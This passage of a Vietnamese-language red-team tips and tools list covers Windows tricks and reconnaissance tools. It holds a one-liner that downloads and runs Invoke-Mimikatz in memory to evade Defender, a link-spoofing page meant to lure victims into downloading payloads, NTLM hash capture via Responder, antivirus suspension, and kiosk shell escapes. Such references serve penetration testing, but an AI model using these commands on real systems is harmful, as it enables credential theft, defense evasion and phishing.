**Mô tả:** *'Liệt kê (**enumeration**) là 95% trò chơi. Tuy nhiên, chạy hàng tấn **quét** để đánh giá môi trường rất ồn ào. Tại sao không chỉ hỏi **DC/DNS server** tất cả các bản ghi **DNS**?'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1587132627823181824)

### [🔙](#tool-list)Tìm đường dẫn dịch vụ không có dấu ngoặc kép mà không cần **PowerUp**

```bash
Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Lưu ý:** Đoạn mã **PowerShell** này truy vấn các dịch vụ **Windows** bằng `Get-CIMInstance`. Nó lọc ra các dịch vụ có chế độ khởi động là "Auto" (tự động chạy khi khởi động), không nằm trong thư mục `C:\Windows*` (để loại bỏ các dịch vụ hệ thống chính) và có đường dẫn thực thi (`PathName`) KHÔNG được đặt trong dấu ngoặc kép. Các đường dẫn không có dấu ngoặc kép và có chứa khoảng trắng có thể dẫn đến lỗ hổng **"Unquoted Service Path"**, cho phép thực thi mã tùy ý nếu kẻ tấn công có thể ghi tệp vào đường dẫn trước dấu khoảng trắng.

**Mô tả:** *'Tìm các đường dẫn dịch vụ không có dấu ngoặc kép mà không cần **PowerUp**'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1579254955554136064)

### [🔙](#tool-list)Bypass dấu nhắc lệnh bị tắt với **/k**

```bash
# Win+R (Để mở hộp Run)
cmd.exe /k "whoami"
```
**Lưu ý:** Lệnh này sử dụng tùy chọn `/k` của **CMD**, tùy chọn này thực thi lệnh theo sau và *sau đó* giữ cửa sổ **CMD** mở. Trong một số môi trường bị hạn chế chỉ hiển thị thông báo "CMD đã bị vô hiệu hóa" và sau đó thoát, việc sử dụng `/k` từ hộp Run (`Win+R`) có thể cho phép lệnh được thực thi thành công *trước khi* thông báo được hiển thị.

**Mô tả:** *'Dấu nhắc lệnh này đã bị quản trị viên của bạn vô hiệu hóa...' Thường có thể thấy trong các môi trường như máy tính **kiosk**, một cách giải quyết nhanh và **hacky** là sử dụng `/k` qua hộp Run của **Windows**. Thao tác này sẽ thực hiện lệnh và sau đó hiển thị thông báo hạn chế, cho phép thực thi lệnh.*

**Đóng góp:** Martin Sohn Christensen

**Liên kết:** [Blog](https://improsec.com/tech-blog/the-command-prompt-has-been-disabled-by-your-administrator-press-any-key-to-continue-or-use-these-weird-tricks-to-bypass-admins-will-hate-you)

### [🔙](#tool-list)Ngăn **Windows Defender** xóa **mimikatz.exe**

```bash
(new-object net.webclient).downloadstring('https://raw.githubusercontent[.]com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')|IEX;inv
```
**Lưu ý:** Đoạn mã **PowerShell** này tải xuống **script PowerShell Invoke-Mimikatz.ps1** trực tiếp từ GitHub (lưu ý thủ thuật thay thế `.` bằng `[.]` để né tránh các cơ chế phát hiện đơn giản) vào bộ nhớ và thực thi nó bằng `IEX` (Invoke-Expression), sau đó gọi hàm chính `inv` trong **script**. Việc này thực thi chức năng tương tự **mimikatz.exe** nhưng trong bộ nhớ, khó bị **Windows Defender** dựa trên chữ ký tệp phát hiện.

**Mô tả:** *'Bạn có chán ngán việc **Windows Defender** xóa **mimikatz.exe** không? Hãy thử cách này thay thế.'*

**Đóng góp:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)

**Liên kết:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1605629049660809216)

### [🔙](#tool-list)Kiểm tra xem bạn có đang ở trong **máy ảo** không

```bash
reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"
```
**Lưu ý:** Lệnh này sử dụng tiện ích **Windows** `reg query` để tìm kiếm đệ quy (sử dụng `/s`) trong khóa registry `HKLM\SYSTEM`. Kết quả đầu ra sau đó được lọc bằng `findstr` để tìm các chuỗi như "VirtualBox", "VBOX", hoặc "VMWare", là các dấu hiệu cho thấy hệ thống đang chạy trong một **máy ảo** phổ biến.

**Mô tả:** *'Bạn muốn biết mình có đang ở trong **Máy ảo** không? Truy vấn các khóa registry và tìm hiểu!!! Nếu có bất kỳ kết quả nào xuất hiện thì bạn đang ở trong **Máy ảo**.'*

**Đóng góp:** [@dmcxblue](https://twitter.com/dmcxblue)

**Liên kết:** [Twitter](https://twitter.com/dmcxblue/status/1366779034672136194)

### [🔙](#tool-list)Liệt kê quy tắc **AppLocker**

```
(Get-AppLockerPolicy -Local).RuleCollections

Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
```
**Lưu ý:** Các lệnh này giúp liệt kê cấu hình **AppLocker** trên hệ thống **Windows**.
`Get-AppLockerPolicy` (PowerShell) lấy policy AppLocker đang hoạt động.
`Get-ChildItem` (PowerShell) và `reg query` (CMD) kiểm tra trực tiếp các khóa registry nơi **AppLocker** lưu trữ quy tắc của nó. Hiểu các quy tắc này giúp kẻ tấn công tìm các binary hoặc **script** được phép thực thi hoặc các kỹ thuật bypass.

**Mô tả:** *'**AppLocker** có thể gây phiền toái. Hãy liệt kê để xem mức độ khó chịu đến đâu'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/alh4zr3d/status/1614706476412698624)

### [🔙](#tool-list)Lối tắt **CMD** với 6 pixel qua **mspaint**

![image](https://user-images.githubusercontent.com/100603074/223849011-24db49d7-37b0-4dad-a7a6-db046f6cb7da.png)

1. Mở **MSPaint.exe** và đặt kích thước canvas thành: Width=6 và Height=1 pixel
2. Thu phóng để thực hiện các tác vụ sau dễ dàng hơn
3. Sử dụng công cụ chọn màu (**color picker**), đặt giá trị pixel (từ trái sang phải):
    - 1st: R: 10, G: 0, B: 0
    - 2nd: R: 13, G: 10, B: 13
    - 3rd: R: 100, G: 109, B: 99
    - 4th: R: 120, G: 101, B: 46
    - 5th: R: 0, G: 0, B: 101
    - 6th: R: 0, G: 0, B: 0
4. Lưu tệp dưới dạng **24-bit Bitmap** (*.bmp;*.dib)
5. Đổi phần mở rộng từ bmp sang bat và chạy.
**Lưu ý:** Đây là một kỹ thuật nâng cao khai thác cách định dạng tệp **BMP** lưu trữ dữ liệu màu để mã hóa các ký tự ASCII vào phần đầu tệp không phải pixel. Khi đổi tên thành `.bat` và chạy, trình thông dịch lệnh sẽ đọc các byte này như lệnh và thực thi chúng, có thể dùng để gọi `cmd.exe`. Hiệu quả của kỹ thuật này phụ thuộc vào cách hệ thống xử lý tệp.

**Mô tả:** *'Một phương pháp khác thường nhưng hiệu quả để lấy **shell** bằng cách tạo lối tắt đến **cmd.exe** thông qua việc vẽ các màu cụ thể trong **Microsoft Paint**. Do thuật toán mã hóa được sử dụng để ghi các tệp **BMP**, có thể định rõ dữ liệu ASCII được ghi vào tệp bằng cách cẩn thận chọn các màu **RGB** nhất định.'*

**Đóng góp:** [PenTestPartners](https://www.pentestpartners.com/)

**Liên kết:** [Blog](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#gainingacommandshell)

### [🔙](#tool-list)Giả mạo liên kết với phương thức JavaScript **PreventDefault**

![image](https://user-images.githubusercontent.com/100603074/223849419-c65fec83-ca1c-4a20-ac06-ec2de537a748.png)

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>PreventDefault Example</title>
  </head>
  <body>
    <a href="https://google.com" onclick="event.preventDefault(); window.location.href = 'https://bing.com';">Go to Google</a>
  </body>
</html>
```
**Lưu ý:** Đoạn mã HTML và JavaScript này minh họa cách sử dụng phương thức `event.preventDefault()` để ngăn hành vi mặc định của một liên kết (`<a>` tag). Trong trường hợp này, mặc dù `href` trỏ đến `google.com` (đây là URL hiển thị khi di chuột qua liên kết), hàm `onclick` sử dụng `preventDefault()` để ngăn trình duyệt đi tới `google.com` và thay vào đó sử dụng `window.location.href = 'https://bing.com'` để chuyển hướng người dùng đến `bing.com`. Kỹ thuật này lừa người dùng nghĩ rằng họ sẽ truy cập một trang web an toàn nhưng thực tế bị đưa đến trang độc hại.

**Mô tả:** *Các tác nhân đe dọa đã được quan sát sử dụng kỹ thuật này để lừa nạn nhân nhấp vào các liên kết tải xuống phần mềm độc hại được giả mạo trên trang. Sử dụng phương thức **JavaScript PreventDefault** bạn có thể giả mạo liên kết khi di chuột (**hover link**) để hiển thị một liên kết hợp pháp `google.com`, nhưng khi nhấp vào, nạn nhân sẽ được chuyển hướng đến liên kết độc hại của bạn `bing.com`. Tuyệt vời để khiến nạn nhân tải xuống **payload** thông qua một trang web do bạn kiểm soát.*

**Liên kết:** [Tài liệu **PreventDefault**](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault)

### [🔙](#tool-list)Kiểm tra quy tắc **firewall SMB** với **Responder**

![image](https://user-images.githubusercontent.com/100603074/229650380-b651cfc4-896f-4429-b7b4-54d1241a5b39.png)

```powershell
Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
```
**Lưu ý:** Lệnh **PowerShell** này cố gắng sao chép các tệp từ thư mục cục bộ `C:\tmp\` trên máy Windows sang thư mục chia sẻ `c$` trên một địa chỉ IP từ xa (`<ip_running_responder>`) nơi **công cụ Responder** đang chạy và lắng nghe kết nối **SMB**. Nếu tường lửa và cấu hình mạng cho phép kết nối **SMB** ra ngoài, máy Windows sẽ cố gắng xác thực (gửi **hash NTLM**) để truy cập chia sẻ, và **Responder** có thể bắt được **hash** này. Đây là cách kiểm tra các quy tắc firewall outbound.

**Mô tả:** *'Khi thực hiện Đánh giá Rủi ro (**Compromise Assessment**), tôi thường hỏi khách hàng liệu tôi có thể thực hiện một kiểm tra nhanh cuối cùng hay không: `Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"`. Nếu **Responder** có thể bắt được **hash**, điều đó có nghĩa là **firewall** cho phép kết nối **SMB** đi ra'*

**Đóng góp:** [@malmoeb](https://twitter.com/malmoeb)

**Liên kết:** [Twitter](https://twitter.com/malmoeb/status/1628272928855826433)

### [🔙](#tool-list)Vô hiệu hóa AV với **SysInternals PsSuspend**

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4519f5ad-c177-4550-b9af-238fa73ad66e)

**Mô tả:** *Sử dụng **công cụ Microsoft Sysinternals PsSuspend.exe**, có thể tạm dừng một số **executable** dịch vụ AV. **Công cụ** được ký bởi Microsoft này có thể được truyền **PID** hoặc Tên của một dịch vụ đang chạy, nó sẽ tạm dừng tiến trình thông qua **API Windows NtSuspendProcess**.*

**Bài đăng trên Blog liên quan:** [Bypassing AV via Process Suspension with PsSuspend.exe](https://medium.com/@a-poc/process-suspension-with-pssuspend-exe-0cdf5d16a3b7)

**Liên kết:** [Twitter](https://twitter.com/0gtweet/status/1638069413717975046)

**Reconnaissance**
====================

### [🔙](#tool-list)[**spiderfoot**](https://github.com/smicallef/spiderfoot)

**SpiderFoot** là một **công cụ** tự động hóa **Open Source Intelligence (OSINT)**. Nó tích hợp với hầu hết mọi nguồn dữ liệu có sẵn và sử dụng một loạt các phương pháp phân tích dữ liệu, giúp dữ liệu dễ dàng điều hướng.

**SpiderFoot** có thể được sử dụng cho mục đích tấn công (ví dụ: trong một bài tập **red team** hoặc kiểm tra **penetration test**) để **reconnaissance** mục tiêu của bạn hoặc phòng thủ để thu thập thông tin về những gì bạn hoặc tổ chức của bạn có thể đã để lộ trên Internet.

**Cài đặt:**

```bash
wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz
tar zxvf v4.0.tar.gz
cd spiderfoot-4.0
pip3 install -r requirements.txt
```
**Lưu ý:** Đây là các lệnh cài đặt tiêu chuẩn trên **Linux** để tải xuống, giải nén mã nguồn, điều hướng vào thư mục và cài đặt các thư viện **Python** yêu cầu. Đảm bảo hệ thống có **Python 3** và `pip3`.

Để biết hướng dẫn cài đặt đầy đủ, xem [tại đây](https://github.com/smicallef/spiderfoot?tab=readme-ov-file#installing--running).

**Cách sử dụng:**

```python
python3 ./sf.py -l 127.0.0.1:5001
```
**Lưu ý:** Lệnh này khởi động **server web SpiderFoot** trên địa chỉ loopback (127.0.0.1) và cổng 5001. Bạn sẽ cần truy cập giao diện web qua trình duyệt để sử dụng **công cụ**.

Rất nhiều video hướng dẫn sử dụng [tại đây](https://asciinema.org/~spiderfoot)

![spiderfoot](https://github.com/user-attachments/assets/1ce26a9e-6fa5-4987-9aea-4943b9c2efec)

*Hình ảnh được sử dụng từ https://github.com/smicallef/spiderfoot*

### [🔙](#tool-list)[**reconftw**](https://github.com/six2dez/reconftw)

**reconFTW** tự động hóa toàn bộ quy trình **reconnaissance** cho bạn. Nó vượt trội trong việc liệt kê tên miền phụ cùng với nhiều kiểm tra lỗ hổng và thu thập thông tin tối đa về mục tiêu của bạn.

**Cài đặt:**

```bash
git clone https://github.com/six2dez/reconftw.git;cd reconftw/;./install.sh
```
**Lưu ý:** Đây là lệnh tải mã nguồn **reconFTW** về (yêu cầu cài đặt **Git**), chuyển vào thư mục của nó và chạy **script cài đặt** (**install.sh**), **script** này sẽ lo phần còn lại (tải xuống dependency, cấu hình ban đầu, ...). Thực hiện trên **Linux/macOS**.

Để biết hướng dẫn cài đặt đầy đủ, xem [tại đây](https://github.com/six2dez/reconftw/wiki/0.-Installation-Guide).

**Cách sử dụng:**

```bash
# Một mục tiêu đơn lẻ
./reconftw.sh -d target.com -r

# Một mục tiêu với nhiều tên miền
./reconftw.sh -m target -l domains.txt -r

# Reconnaissance thụ động
./reconftw.sh -d target.com -p

# Thực hiện tất cả kiểm tra và khai thác
./reconftw.sh -d target.com -a
```
**Lưu ý:** Đây là các ví dụ cơ bản về cách chạy **script reconftw.sh** với các cờ khác nhau. `-d` chỉ định tên miền mục tiêu, `-l` chỉ định danh sách tên miền, `-r` cho chế độ recon thông thường, `-p` cho recon thụ động, `-a` cho tất cả kiểm tra/khai thác. Chạy trên **Linux/macOS**.

Để biết hướng dẫn sử dụng đầy đủ, xem [tại đây](https://github.com/six2dez/reconftw/wiki/2.-Usage-Guide).

![reconftw](https://github.com/user-attachments/assets/1a5abeb5-776d-4c10-a02c-934e1662d817)

*Hình ảnh được sử dụng từ https://www.youtube.com/watch?v=TQmDAtkD1Wo*

### [🔙](#tool-list)[**subzy**](https://github.com/PentestPad/subzy)

Công cụ chiếm quyền điều khiển tên miền phụ (**Subdomain takeover tool**) hoạt động dựa trên việc khớp dấu vân tay phản hồi từ [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz/blob/master/README.md).

**Cài đặt:**

```bash
go install -v github.com/PentestPad/subzy@latest
```
**Lưu ý:** Lệnh này yêu cầu **Go** được cài đặt và cấu hình đúng path. Nó tải xuống và cài đặt **subzy** vào thư mục bin của Go workspace.

Để biết hướng dẫn cài đặt đầy đủ, xem [tại đây](https://github.com/PentestPad/subzy?tab=readme-ov-file#installation).

**Cách sử dụng:**

```bash
# Danh sách các tên miền phụ
./subzy run --targets list.txt

# Một hoặc nhiều mục tiêu
./subzy run --target test.google.com
./subzy run --target test.google.com,https://test.yahoo.com
```
**Lưu ý:** Các lệnh này chạy tệp nhị phân **subzy** đã biên dịch. `-targets` nhận một tệp chứa danh sách URL/tên miền để kiểm tra, `--target` nhận một hoặc nhiều URL/tên miền được phân tách bằng dấu phẩy.

![subzy](https://github.com/user-attachments/assets/d06bff41-8c0f-4d3d-b42e-1221b9866332)

*Hình ảnh được sử dụng từ https://www.geeksforgeeks.org/subzy-subdomain-takeover-vulnerability-checker-tool/*

### [🔙](#tool-list)[**smtp-user-enum**](https://github.com/cytopia/smtp-user-enum)

Liệt kê người dùng **SMTP** qua VRFY, EXPN và RCPT với chức năng timeout, retry và reconnect thông minh.

**Cài đặt:**

```bash
pip install smtp-user-enum
```
**Lưu ý:** Lệnh này cài đặt công cụ từ **PyPI** bằng pip, yêu cầu cài đặt **Python** và `pip`.

**Cách sử dụng:**

```bash
smtp-user-enum [options] -u/-U host port
smtp-user-enum --help
smtp-user-enum --version
```
**Lưu ý:** Các lệnh này hiển thị cách chạy công cụ `smtp-user-enum` với các tùy chọn, hoặc xem trợ giúp/phiên bản. `-u` hoặc `-U` thường được sử dụng để chỉ định tệp chứa tên người dùng hoặc tên người dùng duy nhất để kiểm tra sự tồn tại trên máy chủ **SMTP** tại `host` và `port`.

![smtp-user-enum](https://github.com/user-attachments/assets/2a965690-52f3-412a-90e3-54dd69e0b275)

*Hình ảnh được sử dụng từ https://www.kali.org/tools/smtp-user-enum/*

### [🔙](#tool-list)**crt.sh -> httprobe -> EyeWitness**

Tôi đã ghép nối một lệnh bash một dòng (**one-liner**) thực hiện các tác vụ sau:
- Thu thập danh sách các tên miền phụ một cách thụ động từ các liên kết chứng chỉ ([crt.sh](https://crt.sh/))
- Chủ động gửi yêu cầu tới từng tên miền phụ để xác minh sự tồn tại của nó ([httprobe](https://github.com/tomnomnom/httprobe))
- Chủ động chụp ảnh màn hình từng tên miền phụ để xem xét thủ công ([EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness))

**Cách sử dụng:**

```bash
domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web
```
**Lưu ý:** Chuỗi lệnh bash này kết hợp nhiều công cụ dòng lệnh trên **Linux/macOS**.
`curl` tải về dữ liệu từ crt.sh.
`pup` phân tích HTML và trích xuất các mục từ thẻ `<td>`.
`grep` lọc kết quả để chỉ lấy tên miền chứa `$domain`.
`sort -n | uniq` sắp xếp và loại bỏ các bản sao.
`httprobe` kiểm tra xem các tên miền có hoạt động trên HTTP/S không.
Kết quả được lưu vào một tệp tạm thời.
Cuối cùng, `python3 ... EyeWitness.py` chạy **EyeWitness** để chụp ảnh màn hình các URL trong tệp tạm thời. Yêu cầu tất cả các công cụ này phải được cài đặt.

*Lưu ý: Bạn phải cài đặt [httprobe](https://github.com/tomnomnom/httprobe), [pup](https://github.com/EricChiang/pup) và [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) và thay thế 'DOMAIN_COM' bằng tên miền mục tiêu. Bạn có thể chạy **script** này đồng thời trong nhiều cửa sổ terminal nếu bạn có nhiều tên miền gốc mục tiêu*

![image](https://user-images.githubusercontent.com/100603074/192104474-5836138a-4a61-44fd-b3e3-b2a908c2928e.png)

![image](https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png)

### [🔙](#tool-list)[**jsendpoints**](https://twitter.com/renniepak/status/1602620834463588352)

Một **bookmarklet JavaScript** để trích xuất tất cả các liên kết **endpoint** trang web trên một trang.

Được tạo bởi [@renniepak](https://twitter.com/renniepak), đoạn mã **JavaScript** này có thể được sử dụng để trích xuất tất cả các endpoint (bắt đầu bằng /) từ **DOM** trang web hiện tại bao gồm tất cả các nguồn **script** bên ngoài được nhúng trên trang web.

```javascript
javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
```

**Cách sử dụng (**Bookmarklet**)**

Tạo một bookmarklet...

- `Nhấp chuột phải vào thanh dấu trang của bạn`
- `Nhấp vào 'Thêm trang'`
- `Dán mã JavaScript ở trên vào ô 'url'`
- `Nhấp vào 'Lưu'`

...sau đó truy cập trang web mục tiêu trong trình duyệt và nhấp vào bookmarklet.

![image](https://user-images.githubusercontent.com/100603074/207563211-6c69711a-f7e7-4451-862b-80c9849df7fe.png)

**Cách sử dụng (Console)**

Dán mã JavaScript ở trên vào cửa sổ console `F12` và nhấn enter.

![image](https://user-images.githubusercontent.com/100603074/207563598-d70171b5-823e-491e-a6d5-8657af28b0e5.png)

### [🔙](#tool-list)[**nuclei**](https://github.com/projectdiscovery/nuclei)

Trình quét lỗ hổng nhanh sử dụng các mẫu **.yaml** để tìm kiếm các vấn đề cụ thể.

**Cài đặt:**

```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```
**Lưu ý:** Lệnh này yêu cầu **Go** được cài đặt và cấu hình đúng path. Nó tải xuống và cài đặt **nuclei** vào thư mục bin của Go workspace.

**Cách sử dụng:**

```bash
cat domains.txt | nuclei -t /PATH/nuclei-templates/
```
**Lưu ý:** Lệnh này sử dụng `cat` trên **Linux/macOS** để đọc một danh sách tên miền từ tệp `domains.txt` và chuyển chúng làm đầu vào cho **nuclei**. `-t` chỉ định đường dẫn đến thư mục chứa các tệp mẫu (.yaml) mà **nuclei** sẽ sử dụng để quét. Đây là cách phổ biến để quét nhiều mục tiêu.

![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)

### [🔙](#tool-list)[**certSniff**](https://github.com/A-poc/certSniff)

**certSniff** là một công cụ theo dõi từ khóa nhật ký **Certificate Transparency** mà tôi đã viết bằng **Python**. Nó sử dụng thư viện **certstream** để theo dõi nhật ký tạo chứng chỉ có chứa các từ khóa, được định nghĩa trong một tệp.

Bạn có thể đặt công cụ này chạy với một số từ khóa liên quan đến tên miền mục tiêu của bạn, mọi tạo chứng chỉ sẽ được ghi lại và có thể dẫn đến việc khám phá các tên miền mà trước đây bạn không biết đến.

**Cài đặt:**

```bash
git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt
```
**Lưu ý:** Các lệnh cài đặt tiêu chuẩn trên **Linux/macOS** hoặc hệ thống có cài đặt **Git** và **Python** để tải xuống mã nguồn và cài đặt các thư viện Python cần thiết.

**Cách sử dụng:**

```python
python3 certSniff.py -f example.txt
```
**Lưu ý:** Lệnh này chạy **script Python certSniff.py** với cờ `-f` để chỉ định tệp chứa danh sách các từ khóa cần theo dõi trong luồng nhật ký chứng chỉ công khai. Chạy trên hệ thống có **Python 3**.

![image](https://user-images.githubusercontent.com/100603074/223851512-068261fa-7070-4307-852c-7ef46d938b18.png)

### [🔙](#tool-list)[**gobuster**](https://www.kali.org/tools/gobuster/)

Công cụ hay để **brute force** đường dẫn tệp/thư mục trên trang web mục tiêu.

**Cài đặt:**

```bash
sudo apt install gobuster
```
**Lưu ý:** Lệnh này cài đặt **gobuster** trên các bản phân phối **Linux** dựa trên **Debian/Ubuntu** bằng trình quản lý gói **apt**. Yêu cầu quyền superuser (`sudo`).

**Cách sử dụng:**

```bash
gobuster dir -u "https://google.com" -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20
```
**Lưu ý:** Lệnh này chạy `gobuster` ở chế độ `dir` (khám phá thư mục).
`-u` chỉ định URL mục tiêu.
`-w` chỉ định **wordlist** để **brute force**.
`--wildcard` cho phép xử lý các phản hồi không mong muốn.
`-b` chỉ định các mã trạng thái HTTP để bỏ qua (ví dụ: không phải lỗi hoặc chuyển hướng thành công).
`-t` đặt số lượng luồng đồng thời.

![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)

### [🔙](#tool-list)[**feroxbuster**](https://github.com/epi052/feroxbuster)

Một công cụ được thiết kế để thực hiện "**Forced Browsing**", một cuộc tấn công mà mục đích là liệt kê và truy cập các tài nguyên không được tham chiếu bởi ứng dụng web, nhưng vẫn có thể truy cập được bởi kẻ tấn công.

**Feroxbuster** sử dụng **brute force** kết hợp với **wordlist** để tìm kiếm nội dung không liên kết trong các thư mục mục tiêu. Các tài nguyên này có thể lưu trữ thông tin nhạy cảm về các ứng dụng web và hệ thống vận hành, chẳng hạn như mã nguồn, thông tin xác thực, địa chỉ mạng nội bộ, v.v.

**Cài đặt: (Kali)**

```bash
sudo apt update && sudo apt install -y feroxbuster
```
**Lưu ý:** Các lệnh cập nhật và cài đặt chuẩn trên **Kali Linux** hoặc các hệ thống dựa trên **Debian/Ubuntu** sử dụng **apt**.

**Cài đặt: (Mac)**

```bash
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/master/install-nix.sh | bash
```
**Lưu ý:** Lệnh này tải xuống **script cài đặt** của **feroxbuster** trực tiếp từ **GitHub** và thực thi nó bằng **bash**. Phương pháp cài đặt tiện lợi trên **macOS** hoặc **Linux**.

**Cài đặt: (**Windows**)**

```bash
Invoke-WebRequest https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-windows-feroxbuster.exe.zip -OutFile feroxbuster.zip
Expand-Archive .\feroxbuster.zip
.\feroxbuster\feroxbuster.exe -V
```
**Lưu ý:** Các lệnh **PowerShell** này tải xuống tệp zip của **feroxbuster** cho **Windows**, giải nén nó và chạy tệp thực thi để hiển thị phiên bản (kiểm tra cài đặt thành công). Chạy trên **Windows PowerShell**.

Để biết hướng dẫn cài đặt đầy đủ, xem [tại đây](https://epi052.github.io/feroxbuster-docs/docs/installation/).

**Cách sử dụng:**

```bash
# Thêm .pdf, .js, .html, .php, .txt, .json, và .docx vào mỗi url
./feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx

# Quét với header
./feroxbuster -u http://127.1 -H Accept:application/json "Authorization: Bearer {token}"

# Đọc URL từ stdin
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files

# Proxy request thông qua burpsuite
./feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080
```

Ví dụ sử dụng đầy đủ có thể được tìm thấy [tại đây](https://epi052.github.io/feroxbuster-docs/docs/examples/).

![image](https://user-images.githubusercontent.com/100603074/216729079-7a80f942-a692-4e91-8ffc-7d91d8d69d21.png)

*Hình ảnh được sử dụng từ https://raw.githubusercontent.com/epi052/feroxbuster/main/img/demo.gif*

### [🔙](#tool-list)[**CloudBrute**](https://github.com/0xsha/CloudBrute)

Một công cụ để tìm kiếm hạ tầng, tệp và ứng dụng của một công ty (mục tiêu) trên các nhà cung cấp **cloud** hàng đầu (**Amazon**, **Google**, **Microsoft**, **DigitalOcean**, **Alibaba**, **Vultr**, **Linode**).

Các tính năng:

- Phát hiện **cloud** (**API IPINFO** và Mã nguồn)
- Nhanh (song song)
- Đa nền tảng (**windows**, **linux**, **mac**)
- Ngẫu nhiên hóa **User-Agent**
- Ngẫu nhiên hóa Proxy (**HTTP**, Socks5)

**Cài đặt:**

Tải xuống [phiên bản mới nhất](https://github.com/0xsha/CloudBrute/releases) cho hệ thống của bạn và làm theo hướng dẫn sử dụng.

**Cách sử dụng:**

```bash
# Mục tiêu được chỉ định, tạo từ khóa dựa trên 'target', 80 luồng với timeout là 10, wordlist 'storage_small.txt'
CloudBrute -d target.com -k target -m storage -t 80 -T 10 -w "./data/storage_small.txt"

# Xuất kết quả ra file
CloudBrute -d target.com -k keyword -m storage -t 80 -T 10 -w -c amazon -o target_output.txt
```
**Lưu ý:** Đây là các ví dụ về cách chạy tệp nhị phân **CloudBrute** với các tham số dòng lệnh khác nhau. `-d` chỉ định tên miền, `-k` từ khóa, `-m` chế độ (ví dụ: storage), `-t` số luồng, `-T` timeout, `-w` wordlist, `-c` cloud provider cụ thể, `-o` tệp đầu ra.

![image](https://user-images.githubusercontent.com/100603074/216729172-5d58d005-85a8-49f2-8968-98b459961f81.png)

*Hình ảnh được sử dụng từ https://github.com/0xsha/CloudBrute*

### [🔙](#tool-list)[**dnsrecon**](https://www.kali.org/tools/dnsrecon/#dnsrecon)

**dnsrecon** là một công cụ **python** để liệt kê các bản ghi **DNS** (**MX, SOA, NS, A, AAAA, SPF** và **TXT**) và có thể cung cấp một số máy chủ mục tiêu mới liên quan để chuyển hướng sang từ một lần tìm kiếm tên miền duy nhất.

**Cài đặt:**

```bash
sudo apt install dnsrecon
```
**Lưu ý:** Cài đặt tiêu chuẩn trên **Linux/Debian/Ubuntu** sử dụng **apt**.

**Cách sử dụng:**

```bash
dnsrecon -d google.com
```
**Lưu ý:** Lệnh này chạy `dnsrecon` để thực hiện các kiểm tra liệt kê DNS tiêu chuẩn cho tên miền được chỉ định (`google.com`).

![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)

### [🔙](#tool-list)[**shodan.io**](https://www.shodan.io/dashboard)

**Shodan** thu thập thông tin về hạ tầng công khai và hiển thị chúng ở định dạng có thể tìm kiếm. Sử dụng tên công ty, tên miền, địa chỉ IP, có thể phát hiện các hệ thống có khả năng dễ bị tấn công liên quan đến mục tiêu của bạn thông qua **shodan**.

![image](https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png)

### [🔙](#tool-list)[**AORT**](https://github.com/D3Ext/AORT)

Công cụ để liệt kê tên miền phụ, liệt kê **DNS**, phát hiện **WAF**, **WHOIS**, quét cổng (**port scan**), **wayback machine**, thu thập email (**email harvesting**).

**Cài đặt:**

```bash
git clone https://github.com/D3Ext/AORT; cd AORT; pip3 install -r requirements.txt
```
